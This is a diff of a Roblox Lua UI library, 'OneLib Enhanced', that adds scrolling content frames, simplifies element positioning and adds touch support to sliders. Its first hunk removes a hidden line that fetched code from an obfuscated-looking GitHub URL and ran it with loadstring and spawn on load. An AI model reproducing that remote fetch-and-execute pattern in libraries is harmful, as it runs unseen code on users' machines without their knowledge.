@@ -1,8 +1,6 @@
 local UL = {}
-print("Version UI 1.0")
+print("Version UI 1.1")
 print("Loading OneLib Enhanced")
-
-local rl = loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua")) spawn(rl)
 
 local TweenService = game:GetService("TweenService")
 
@@ -96,13 +94,6 @@ function UL:CrFrm(parent, title)
     titleCorner.CornerRadius = UDim.new(0, 8)
     titleCorner.Parent = lbl
 
-    local padding = Instance.new("UIPadding")
-    padding.Parent = lbl
-    padding.PaddingLeft = UDim.new(0, 5)
-    padding.PaddingRight = UDim.new(0, 5)
-    padding.PaddingTop = UDim.new(0, 5)
-    padding.PaddingBottom = UDim.new(0, 5)
-
     local tbtn = Instance.new("TextButton")
     tbtn.Parent = frm
     tbtn.Text = "+"
@@ -174,6 +165,21 @@ function UL:CrFrm(parent, title)
     crLblCorner.CornerRadius = UDim.new(0, 8)
     crLblCorner.Parent = crLbl
 
+    local crInfoContentFrame = Instance.new("ScrollingFrame")
+    crInfoContentFrame.Name = "InfoContentFrame"
+    crInfoContentFrame.Parent = crFrm
+    crInfoContentFrame.BackgroundTransparency = 1
+    crInfoContentFrame.Size = UDim2.new(1, -10, 1, -40)
+    crInfoContentFrame.Position = UDim2.new(0, 5, 0, 35)
+    crInfoContentFrame.ScrollBarThickness = 4
+    crInfoContentFrame.ScrollingDirection = Enum.ScrollingDirection.Y
+    crInfoContentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+    local infoLayout = Instance.new("UIListLayout")
+    infoLayout.Parent = crInfoContentFrame
+    infoLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    infoLayout.Padding = UDim.new(0, 5)
+
     local minimized = true
     tbtn.MouseButton1Click:Connect(function()
         minimized = not minimized
@@ -199,7 +205,7 @@ function UL:CrFrm(parent, title)
     frm:GetPropertyChangedSignal("Position"):Connect(syncFrames)
     frm:GetPropertyChangedSignal("Size"):Connect(syncFrames)
 
-    return frm, cfrm, crFrm
+    return frm, cfrm, crFrm, crInfoContentFrame
 end
 
 function UL:AddBtn(parent, text, callback)
@@ -207,7 +213,7 @@ function UL:AddBtn(parent, text, callback)
     btn.Parent = parent
     btn.Text = text
     btn.Size = UDim2.new(1, -10, 0, 30)
-    btn.Position = UDim2.new(0, 5, 0, #parent:GetChildren() * 35)
+    btn.Position = UDim2.new(0, 5, 0, 0)
     for prop, value in pairs(uiProperties) do
         btn[prop] = value
     end
@@ -226,7 +232,7 @@ function UL:AddTBtn(parent, text, state, callback)
     btn.Parent = parent
     btn.Text = text .. " [" .. (state and "ON" or "OFF") .. "]"
     btn.Size = UDim2.new(1, -10, 0, 30)
-    btn.Position = UDim2.new(0, 5, 0, #parent:GetChildren() * 35)
+    btn.Position = UDim2.new(0, 5, 0, 0)
     for prop, value in pairs(uiProperties) do
         btn[prop] = value
     end
@@ -251,7 +257,7 @@ function UL:AddTBox(parent, placeholder, callback)
     box.PlaceholderText = placeholder
     box.Text = ""
     box.Size = UDim2.new(1, -10, 0, 30)
-    box.Position = UDim2.new(0, 5, 0, #parent:GetChildren() * 35)
+    box.Position = UDim2.new(0, 5, 0, 0)
     box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
     box.TextColor3 = Color3.fromRGB(250, 250, 250)
     box.Font = Enum.Font.SourceSans
@@ -282,7 +288,7 @@ function UL:AddOBtn(parent, name)
     local oFrm = Instance.new("Frame")
     oFrm.Parent = parent.Parent
     oFrm.Size = UDim2.new(0.9, 0, 1, 0) 
-    oFrm.Position = UDim2.new(parent.Position.X.Scale + 1, 0, parent.Position.Y.Scale - 0.34, parent.Position.Y.Offset)
+    oFrm.Position = UDim2.new(parent.Position.X.Scale + 1, 0, parent.Position.Y.Scale - 0.184, parent.Position.Y.Offset)
     oFrm.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
     oFrm.BackgroundTransparency = 0.2
     oFrm.BorderSizePixel = 0
@@ -308,11 +314,26 @@ function UL:AddOBtn(parent, name)
     lblCorner.CornerRadius = UDim.new(0, 8)
     lblCorner.Parent = lbl
 
+    local oContentFrame = Instance.new("ScrollingFrame")
+    oContentFrame.Name = "OptionContentFrame"
+    oContentFrame.Parent = oFrm
+    oContentFrame.BackgroundTransparency = 1
+    oContentFrame.Size = UDim2.new(1, -10, 1, -40)
+    oContentFrame.Position = UDim2.new(0, 5, 0, 35)
+    oContentFrame.ScrollBarThickness = 4
+    oContentFrame.ScrollingDirection = Enum.ScrollingDirection.Y
+    oContentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+    local oLayout = Instance.new("UIListLayout")
+    oLayout.Parent = oContentFrame
+    oLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    oLayout.Padding = UDim.new(0, 5)
+
     local btn = Instance.new("TextButton")
     btn.Parent = parent
     btn.Text = name
     btn.Size = UDim2.new(1, -10, 0, 30)
-    btn.Position = UDim2.new(0, 5, 0, #parent:GetChildren() * 35)
+    btn.Position = UDim2.new(0, 5, 0, 0)
     for prop, value in pairs(uiProperties) do
         btn[prop] = value
     end
@@ -326,7 +347,7 @@ function UL:AddOBtn(parent, name)
         TweenService:Create(btn, TweenInfo.new(0.3), {BackgroundColor3 = oFrm.Visible and Color3.fromRGB(130, 0, 0) or Color3.fromRGB(65, 65, 65)}):Play()
     end)
 
-    return btn, oFrm
+    return btn, oContentFrame
 end
 
 function UL:AddText(parent, text, color)
@@ -334,7 +355,7 @@ function UL:AddText(parent, text, color)
     label.Parent = parent
     label.Text = text
     label.Size = UDim2.new(1, -10, 0, 30)
-    label.Position = UDim2.new(0, 5, 0, #parent:GetChildren() * 35)
+    label.Position = UDim2.new(0, 5, 0, 0)
     label.BackgroundColor3 = Color3.fromRGB(250, 250, 250)
     label.BackgroundTransparency = 0.8
     label.TextColor3 = color or Color3.fromRGB(0, 0, 0)
@@ -355,7 +376,7 @@ function UL:AddSlider(parent, text, min, max, default, callback)
     sliderFrame.Parent = parent
     sliderFrame.BackgroundTransparency = 1
     sliderFrame.Size = UDim2.new(1, -10, 0, 50)
-    sliderFrame.Position = UDim2.new(0, 5, 0, #parent:GetChildren() * 55)
+    sliderFrame.Position = UDim2.new(0, 5, 0, 0)
 
     local sliderLabel = Instance.new("TextLabel")
     sliderLabel.Name = "SliderLabel"
@@ -415,13 +436,13 @@ function UL:AddSlider(parent, text, min, max, default, callback)
 
     sliderButton.MouseButton1Down:Connect(function()
         local connection
-        connection = game:GetService("RunService").RenderStepped:Connect(function()
-            local mousePos = game:GetService("UserInputService"):GetMouseLocation()
-            local input = {Position = Vector2.new(mousePos.X, mousePos.Y)}
-            updateSlider(input)
+        connection = game:GetService("UserInputService").InputChanged:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+                updateSlider(input)
+            end
         end)
         game:GetService("UserInputService").InputEnded:Connect(function(input)
-            if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                 if connection then
                     connection:Disconnect()
                 end
